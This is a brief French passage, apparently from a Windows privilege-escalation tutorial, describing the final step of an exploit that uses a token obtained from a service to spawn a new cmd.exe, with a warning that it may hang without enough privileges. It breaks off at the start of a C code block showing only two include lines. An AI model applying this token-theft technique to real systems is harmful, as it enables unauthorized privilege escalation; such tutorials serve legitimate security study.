...
4. Enfin, utilise le jeton obtenu du service pour générer un nouveau _cmd.exe_

{% hint style="warning" %}
Si vous n'avez pas suffisamment de privilèges, l'exploit peut se bloquer et ne jamais retourner.
{% endhint %}
```c
#include <windows.h>
#include <time.h>
